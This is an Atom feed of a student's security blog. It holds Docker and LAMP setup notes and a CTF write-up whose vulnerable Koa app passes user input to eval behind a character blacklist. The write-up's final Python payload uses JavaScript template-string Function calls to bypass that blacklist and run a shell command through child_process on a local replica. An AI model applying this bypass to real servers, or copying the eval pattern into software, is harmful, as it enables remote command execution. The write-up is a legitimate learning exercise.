<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>R4in1&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/7bad76cc358398f53210bf07081edb51</icon>
  <subtitle>喜欢美好的事物。</subtitle>
  <link href="https://r4in1.github.io/atom.xml" rel="self"/>
  
  <link href="https://r4in1.github.io/"/>
  <updated>2020-12-02T10:05:45.332Z</updated>
  <id>https://r4in1.github.io/</id>
  
  <author>
    <name>R4in1</name>
    <email>1582612801@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用docker配置lamp环境</title>
    <link href="https://r4in1.github.io/2020/12/02/%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AElamp%E7%8E%AF%E5%A2%83/"/>
    <id>https://r4in1.github.io/2020/12/02/%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AElamp%E7%8E%AF%E5%A2%83/</id>
    <published>2020-12-02T09:11:31.000Z</published>
    <updated>2020-12-02T10:05:45.332Z</updated>
    
    <content type="html"><![CDATA[<p>前一段时间学了一下windows下docker的使用，y1s1，虽说学起来好像有点麻烦，但是确实香的一，今天上午的实验课几乎啥都没搞，就弄了一下docker，感觉好像没那么复杂，但是中途还是遇到了一些坑，或许是自己太菜了吧，写（水）篇blog记录一下</p><h2 id="容器创建"><a href="#容器创建" class="headerlink" title="容器创建"></a>容器创建</h2><p>其实镜像仓库一般都有配置好的lamp环境，但是貌似都是专门为某一个应用配置的环境，我打算单纯用ubuntu重新弄一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name lamp -p 8009:80 -p 8037:3306 -v c/User/Francis/Docker/lamp/:/var/www/ ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>先把容器跑起来再说，方便以后对<code>www</code>目录的更改，可以<code>-v</code>创建目录映射，把<code>/var/www/</code>映射到宿主机上</p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>这一步遇到许多坑，首先还是<code>apt</code>的问题，docker容器刚创建要先执行<code>apt update</code>然后才能使用<code>apt</code>安装其他应用，执行完执行后先安装<code>vim</code>或者<code>nano</code>等文本编辑器，方便修改一些配置文件之类的</p><h3 id="更换apt源"><a href="#更换apt源" class="headerlink" title="更换apt源"></a>更换apt源</h3><p>众所周知，由于某种不可抗力，直接使用官方的源，安装和更新会很慢，于是一般都会修改<code>/etc/apt/sources.list</code>文件改到国内的源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apt/</span><br><span class="line">mv sources.list sources.list.bak</span><br><span class="line">nano sources.list</span><br></pre></td></tr></table></figure><p>然后把一些国内的源粘贴进去，比如阿里云的源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>然后就会发现自己安装php，apache等等，会变得很快很快很快。。。</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>但是！啪的一下，很快啊！就会遇到一个问题，安装mysql-server疯狂报错，mysql-client都没有问题，但是mysql-server就是不行，我人直接傻了，但是身为一名会百度的菜鸡，我是不会这么容易就放弃的，百度查了半天，再结合报错信息，会发现是perl依赖的问题，于是乎安装perl，然后会发现perl依赖于其他的软件包，那就安装依赖包，好家伙，其他依赖包又依赖于其他的依赖。。。最后貌似还形成了一个环？？？</p><p>到此进度就停住了，<del>lamp没有m应该也可以用？</del></p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>说实话我也不知道是什么原理，但是把阿里云的源换回原来的官方的源就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/apt/sources.list /etc/apt/sources.list.bak2</span><br><span class="line">mv /etc/apt/sources.list.bak /etc/apt/sources.list</span><br><span class="line">apt update</span><br><span class="line">apt install perl</span><br><span class="line">apt install mysql-server</span><br><span class="line"><span class="comment"># 安装过程极其丝滑（相比于像一个憨憨一样手动安装依赖，虽然速度慢了点，但是还是丝滑多了）</span></span><br></pre></td></tr></table></figure><p>？？？虽然问题解决了，但是，什么原理？</p><p><img src="C:%5CUsers%5CFrancis%C2%B7L%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201202174921483.png" alt="image-20201202174921483"></p><p>这里挖个坑吧，以后有空研究一下为什么，以及sources.list的工作原理</p><h2 id="环境运行"><a href="#环境运行" class="headerlink" title="环境运行"></a>环境运行</h2><p>剩下的基本上就很简单了，启动对应的服务就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">service mysql start</span><br></pre></td></tr></table></figure><p>以为到这里就结束了？不，还有坑，因为我安装的php，apache以及mysql全部都没有限制版本，于是乎全部都是最新版，emmm学习一下最新版的使用也是不错的，所以我就学到了最新版mysql更设置密码的方法</p><p>mysql5.7.9版本之后废弃了<code>password()</code>函数，所以说不能再用原来的方式更改密码了，旧的咒语不生效了，新的咒语是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># update mysql.user set authentication_string&#x3D;password(&#39;new_pass&#39;) where host&#x3D;&#39;localhost&#39; and user&#x3D;&#39;root&#39;;</span><br><span class="line"># 旧的咒语，不好！</span><br><span class="line">alter user &#39;root&#39;@&#39;localhost&#39; identified with mysql_native_password by &#39;new_pass&#39;;</span><br><span class="line"># 新的咒语，好！</span><br></pre></td></tr></table></figure><p>并且，直接apt安装php，是没有mysqli扩展的，也就是说还要手动安装，我真是太闲，为啥非要自己弄lamp。。。</p><p>访问index.html，ok，算是成功了吧。</p>]]></content>
    
    
    <summary type="html">使用docker的ubuntu镜像搭建一个lamp环境</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://r4in1.github.io/categories/CTF/WEB/"/>
    
    
    <category term="docker" scheme="https://r4in1.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>docker学习笔记</title>
    <link href="https://r4in1.github.io/2020/11/29/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://r4in1.github.io/2020/11/29/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-29T02:19:24.000Z</published>
    <updated>2020-12-02T03:26:33.327Z</updated>
    
    <content type="html"><![CDATA[<p>docker一些常用的命令以及使用方法</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">docker images <span class="comment"># 列出已加载的镜像</span></span><br><span class="line">docker pull ubuntu <span class="comment"># 获取镜像（默认最新版，可加:1.1.1获取特定版本）</span></span><br><span class="line">docker search httpd <span class="comment"># 搜索镜像</span></span><br><span class="line">docker ps -a <span class="comment"># 列出所有容器的状态，不加-a为列出正在运行的容器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- run docker ------------------------------</span></span><br><span class="line">docker run -it ubuntu /bin/bash <span class="comment"># 启动一个容器（同时进入容器命令行）</span></span><br><span class="line"><span class="comment"># 参数说明：-i 交互模式，-t 终端，ubuntu 使用ubuntu镜像，/bin/bash 执行的命令（获取一个交互式的shell）</span></span><br><span class="line">docker run -itd --name myUbuntu ubuntu /bin/bash <span class="comment"># 后台启动一个容器（不会进入容器的命令行）</span></span><br><span class="line"><span class="comment"># 参数说明：-d 后台运行，--name 为容器命名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- manage containers -----------------------</span></span><br><span class="line">docker start &lt;容器id/容器名字&gt; <span class="comment"># 启动一个已停止的容器</span></span><br><span class="line">docker stop &lt;容器id/容器名字&gt; <span class="comment"># 停止一个正在运行的容器</span></span><br><span class="line">docker restart &lt;容器id/容器名字&gt; <span class="comment"># 重启一个容器</span></span><br><span class="line">docker rm -f &lt;容器id/容器名字&gt; <span class="comment"># 删除一个容器，-f参数为强制删除</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- enter containers ------------------------</span></span><br><span class="line">docker <span class="built_in">exec</span> -it &lt;容器id/容器名字&gt; /bin/bash <span class="comment"># 推荐使用，退出不会停止容器</span></span><br><span class="line">docker attach &lt;容器id/容器名字&gt; <span class="comment"># 退出会停止容器</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="使用docker创建web应用"><a href="#使用docker创建web应用" class="headerlink" title="使用docker创建web应用"></a>使用docker创建web应用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8848:5000 training/webapp python app.py</span><br><span class="line"><span class="comment"># 当本地不存在该镜像时，docker会自动下载该镜像</span></span><br><span class="line"><span class="comment"># -p参数为端口映射，将容器的5000端口映射到主机的8848端口上</span></span><br><span class="line"><span class="comment"># -P内部端口随机映射到主机的一个端口上</span></span><br><span class="line"><span class="comment"># python app.py为执行的命令，即启动flask服务</span></span><br><span class="line"></span><br><span class="line">docker port &lt;容器id/容器名字&gt; <span class="comment"># 查看一个容器的端口映射情况</span></span><br><span class="line">docker logs -f &lt;容器id/容器名字&gt; <span class="comment"># 查看容器的日志，-f可以使该命令已知执行</span></span><br><span class="line">docker top &lt;容器id/容器名字&gt; <span class="comment"># 查看容器内部运行的进程</span></span><br></pre></td></tr></table></figure><h3 id="创建目录映射"><a href="#创建目录映射" class="headerlink" title="创建目录映射"></a>创建目录映射</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 8848:80 -v c/Users/R4in1/Docker/lamp/:/var/www/ ubuntu /bin/bash</span><br><span class="line"><span class="comment"># 将容器的/var/www目录映射到主机的C盘Users/R4in1/Docker/lamp目录</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">关于docker的使用方法以及学习记录</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    
    <category term="docker" scheme="https://r4in1.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>关于Javascript模板字符串</title>
    <link href="https://r4in1.github.io/2020/11/28/%E5%85%B3%E4%BA%8EJavascript%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://r4in1.github.io/2020/11/28/%E5%85%B3%E4%BA%8EJavascript%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2020-11-28T13:00:09.000Z</published>
    <updated>2020-11-30T02:46:51.904Z</updated>
    
    <content type="html"><![CDATA[<p>今天打算使用docker复现一下前一段时间校赛的题目，算是复习知识点并学习使用docker</p><p>来源：校赛华为杯决赛题目</p><h2 id="KOA2"><a href="#KOA2" class="headerlink" title="KOA2"></a>KOA2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull node</span><br><span class="line">docker run --name koa -it -p 2020:80 node /bin/bash</span><br></pre></td></tr></table></figure><p>进入容器后先安装koa以及一些需要用到的模块和常用的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir node</span><br><span class="line"><span class="built_in">cd</span> node</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">npm i koa</span><br><span class="line">npm i koa-router</span><br><span class="line">npm i koa-bodyparser</span><br><span class="line">npm i fs</span><br><span class="line">apt update &amp;&amp; apt upgrade</span><br><span class="line">apt install nano</span><br></pre></td></tr></table></figure><p>写入源码并启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nano app.js <span class="comment"># 将源代码复制到文件中</span></span><br><span class="line">node app.js <span class="comment"># 启动服务</span></span><br></pre></td></tr></table></figure><p>此时访问localhost:2020可以看到服务已经启动了</p><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>题目源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Parser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"><span class="keyword">let</span> router = <span class="keyword">new</span> Router();</span><br><span class="line"></span><br><span class="line">app.use(Parser());</span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">    ctx.response.body = <span class="string">`&lt;html&gt;&lt;a href=&quot;/src&quot;&gt;Source Code&lt;/a&gt;&lt;/html&gt;`</span>;&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> btoa = <span class="function"><span class="params">s</span> =&gt;</span> <span class="keyword">new</span> Buffer(s + <span class="string">&#x27;&#x27;</span>).toString(encoding=<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> atob = <span class="function"><span class="params">s</span> =&gt;</span> <span class="keyword">new</span> Buffer(s + <span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;base64&#x27;</span>).toString();</span><br><span class="line"><span class="keyword">const</span> src = btoa(fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>));</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">    ctx.response.body = src;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">let</span> filter = <span class="function"><span class="params">expr</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> blacklist = [<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27; &#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> ele <span class="keyword">of</span> expr) &#123;</span><br><span class="line">        <span class="keyword">if</span> (blacklist.includes(ele))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">router.post(<span class="string">&#x27;/expr&#x27;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> expr = ctx.request.body.expr || <span class="string">&#x27;8 ^ 1&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!filter(expr)) &#123;</span><br><span class="line">        ctx.response.body = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ctx.response.body = <span class="built_in">eval</span>(expr);</span><br><span class="line">&#125;)</span><br><span class="line">app.use(router.routes());</span><br><span class="line">app.listen(<span class="number">9999</span>); <span class="comment">// 复制源码时改成自己想要的的端口，比如80</span></span><br></pre></td></tr></table></figure><p>当时写这道题目当时没有写出来，后来看到RL的题解，考点是javascript模板字符串</p><p>可参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings</a></p><p>总之大概就是反引号包裹的字符串可以嵌入表达式，并且可以用反引号代替括号调用函数</p><p>举个栗子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> b = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">let</span> r1 = <span class="string">&#x27;return arg1&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> r2 = <span class="string">&#x27;return arg2&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span><span class="string">`arg1<span class="subst">$&#123;r1&#125;</span>arg2`</span>(<span class="string">&#x27;this is text1&#x27;</span>,<span class="string">&#x27;this is text2&#x27;</span>)); <span class="comment">// this is text1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span><span class="string">`arg1<span class="subst">$&#123;r2&#125;</span>arg2`</span>(<span class="string">&#x27;this is text1&#x27;</span>,<span class="string">&#x27;this is text2&#x27;</span>)); <span class="comment">// this is text2</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span><span class="string">`arg1<span class="subst">$&#123;r1&#125;</span>arg2`</span><span class="string">`text1<span class="subst">$&#123;b&#125;</span>text2`</span>); <span class="comment">// [ &#x27;text1&#x27;, &#x27;text2&#x27; ]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span><span class="string">`arg1<span class="subst">$&#123;r2&#125;</span>arg2`</span><span class="string">`text1<span class="subst">$&#123;b&#125;</span>text2`</span>); <span class="comment">// 2333</span></span><br><span class="line"><span class="comment">// 解析：</span></span><br><span class="line"><span class="comment">// `text1$&#123;b&#125;tex2` 返回结果为一个数组[ &#x27;text1&#x27;, &#x27;text2&#x27; ]和变量b</span></span><br><span class="line"><span class="comment">// `$&#123;b&#125;text2` 返回结果为一个数组[ &#x27;&#x27;, &#x27;text2&#x27; ]和变量b</span></span><br><span class="line"><span class="comment">// `text1$&#123;b&#125;` 返回结果为一个数组[ &#x27;text1&#x27;, &#x27;&#x27; ]和变量b</span></span><br><span class="line"><span class="comment">// `` 返回结果为一个数组[ &#x27;&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Function()函数用于构造匿名函数，将最后一个参数的值作为函数体，前面的参数值作为匿名函数的参数名</span></span><br><span class="line"><span class="comment">// Function(&#x27;arg1&#x27;, &#x27;arg2&#x27;, &#x27;return arg2&#x27;)构造匿名函数，等同于function(arg1, arg2)&#123;return arg2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Function()函数的第一个参数还可以是数组，结果为将数组中的每一个元素作为匿名函数的参数名</span></span><br><span class="line"><span class="comment">// 即Function([ &#x27;arg1&#x27;, &#x27;arg2&#x27; ], &#x27;return arg2&#x27;)也起到同样的作用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 因此Function`arg1$&#123;&#x27;return arg1&#x27;&#125;arg2`将返回一个匿名函数</span></span><br><span class="line"><span class="comment">// Function`arg1$&#123;&#x27;return arg1&#x27;&#125;arg2`(&#x27;this is text1&#x27;,&#x27;this is text2&#x27;)将返回字符串&#x27;this is text1&#x27;</span></span><br><span class="line"><span class="comment">// Function`arg1$&#123;&#x27;return arg1&#x27;&#125;arg2``text1$&#123;tmp&#125;text2`将返回数组[ &#x27;text1&#x27;, &#x27;text2&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Final</span></span><br><span class="line"><span class="comment">// Function`arg1$&#123;tmp&#125;arg2```构造并调用匿名函数，函数体为变量tmp的值，可接受两个参数arg1和arg2</span></span><br></pre></td></tr></table></figure><h3 id="final-payload"><a href="#final-payload" class="headerlink" title="final payload"></a>final payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rr</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:2020/expr/&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;return global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;expr&#x27;</span>: <span class="string">&#x27;Function`arg$&#123;ctx[`request`][`header`][`h`]&#125;arg2```&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = rr.post(url=url, headers=headers, data=data)</span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">// res: root</span><br></pre></td></tr></table></figure><p>关于<code>ctx</code>：<a href="https://www.cnblogs.com/lfri/p/11936231.html">https://www.cnblogs.com/lfri/p/11936231.html</a></p>]]></content>
    
    
    <summary type="html">从一道题学习Javascript模板字符串</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://r4in1.github.io/categories/CTF/WEB/"/>
    
    
    <category term="javascript" scheme="https://r4in1.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://r4in1.github.io/2020/11/23/hello-world/"/>
    <id>https://r4in1.github.io/2020/11/23/hello-world/</id>
    <published>2020-11-23T08:51:39.352Z</published>
    <updated>2020-12-02T10:07:53.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><p>你好，欢迎来到R4in1’s Blog.</p><p>本人大三狗一枚，可能会偶尔分享一些信息安全方面的知识。</p><p><img src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" alt="pic"></p><a class="btn-beautify button--animated " href="https://R4in1.github.io"   title="R4in1"><span>R4in1</span></a>]]></content>
    
    
    <summary type="html">Hello World! This is R4in1&#39;s Blog. Welcome!</summary>
    
    
    
    <category term="MIX" scheme="https://r4in1.github.io/categories/MIX/"/>
    
    
  </entry>
  
</feed>
